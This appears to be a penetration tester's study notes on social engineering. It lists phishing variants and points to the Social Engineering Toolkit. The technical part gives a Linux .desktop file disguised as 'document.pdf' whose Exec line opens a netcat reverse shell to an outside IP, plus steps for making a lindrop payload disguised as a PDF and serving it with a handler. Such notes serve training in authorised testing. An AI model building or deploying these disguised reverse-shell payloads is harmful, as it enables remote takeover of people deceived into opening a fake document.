# Social Engineering

Types of social engineering:

1.  Pretexting
2.  Phishing - Whailing(Targets Executives in an organization, such as the CFO for gaining specific types of information) and Spear Phishing(Targets specific individuals within an organization, to try and circumvent detection)
3.  Baiting
4.  Physical

[https://www.virustotal.com/gui/](https://www.virustotal.com/gui/)

## Social Engineering Toolkit (SET)

[SET](https://github.com/trustedsec/social-engineer-toolkit)  
[SET Readme](https://github.com/trustedsec/social-engineer-toolkit/tree/master/readme)

`setoolkit`

Social Engineering Attacks > Spear-Phishing Attack Vectors > select options

* * *

* * *

Create test.desktop file

Then edit that by following:

```
[Desktop Entry]
Type=Application
Name=document.pdf
Exec=/bin/nc -e /bin/sh 192.168.13.71 4444
Icon=[in command propt type *pdf.svg and will list some icons we can select path from there and give it over here]
```


lidrop is a tool that can be used:

[https://obscurechannel.com/x42/lindrop.html](https://obscurechannel.com/x42/lindrop.html)

run lindrop.py
then create a payload and a handler.
run simple http server so that we can give url of the payload.
Then give url of the output pdf file.